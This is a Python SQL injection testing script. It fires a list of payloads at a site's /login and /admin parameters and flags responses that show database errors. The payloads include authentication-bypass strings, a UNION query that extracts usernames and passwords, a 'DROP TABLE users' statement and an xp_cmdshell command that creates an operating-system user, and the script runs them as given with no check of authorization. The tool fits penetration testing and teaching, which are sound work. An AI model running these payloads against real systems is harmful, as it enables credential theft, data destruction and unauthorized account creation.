import requests
from urllib.parse import urljoin, urlencode
import logging

class SQLInjectionTester:
    def __init__(self, base_url: str, endpoints: list[str] = None, timeout: float = 5.0):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.timeout = timeout
        self.endpoints = endpoints or ['/']
        self.results = {}  # Dictionary to store the results

    def _get(self, url: str):
        """Helper function to send GET request."""
        resp = self.session.get(url, timeout=self.timeout)
        resp.raise_for_status()
        return resp

    def test_sql_injection(self, target_url: str = None):
        """Test for SQL Injection vulnerabilities."""
        if not target_url:
            target_url = self.base_url  # If no target URL is provided, use the class's base URL

        payloads = [
            "' OR 1=1 --",  # Classic SQL Injection
            "' OR 'a'='a",  # Another form of classic SQL Injection
            "' UNION SELECT NULL, username, password FROM users --",  # Union-based Injection
            "'; DROP TABLE users --",  # Dangerous query (for destructive testing)
            "admin'--",  # Comment-based SQL injection
            "' OR '1'='1' -- ",  # Always true condition
            "'; --",  # Comment with semicolon
            "'; EXEC xp_cmdshell('net user test testpass /add') --",  # Command execution via SQL Injection
        ]

        vuln_found = False
        for path in self.endpoints:
            url = urljoin(target_url, path)  # Construct the full URL for the endpoint
            for payload in payloads:
                # Try each payload in the URL query parameter (assuming 'username' is the vulnerable parameter)
                params = {'username': payload, 'password': 'any'}  # Adding payload in the username parameter
                query_string = urlencode(params)
                full_url = f"{url}?{query_string}"

                try:
                    response = self._get(full_url)
                    if "error" in response.text.lower() or "mysql" in response.text.lower() or "syntax" in response.text.lower():
                        logging.warning(f"SQL Injection vulnerability detected on {full_url} with payload: {payload}")
                        vuln_found = True
                        self.results[full_url] = (payload, response.text)  # Store result in dictionary
                        return True, payload
                except requests.exceptions.RequestException as e:
                    logging.error(f"Error testing {full_url} with payload {payload}: {e}")
                    continue

        self.results[url] = (None, None)  # If no vulnerabilities found for this endpoint
        return False, None

    def print_results(self):
        """Print the test results in a formatted manner."""
        for name, (vuln, info) in self.results.items():
            # Format the output to match your desired style
            vuln_str = "None" if vuln is None else vuln  # Show "None" if no vulnerability
            info_str = info if info is not None else "None"  # If no info, display "None"
            
            # Print formatted result
            line = f"{name:25s} → vulnerability:{vuln_str}"
            line += f"  info={info_str}"  # Append info or "None" if no info is available
            print(line)

if __name__ == "__main__":
    base_url = "http://example.com"  # Replace with the actual URL of the site you want to test
    tester = SQLInjectionTester(base_url, endpoints=["/login", "/admin"])  # List your endpoints here
    
    # Test for SQL Injection without passing a URL (it will use base_url)
    tester.test_sql_injection()
    
    # Test for SQL Injection with a dynamic target URL
    tester.test_sql_injection("http://example.com/another-path")
    
    # Print the results of the tests
    tester.print_results()
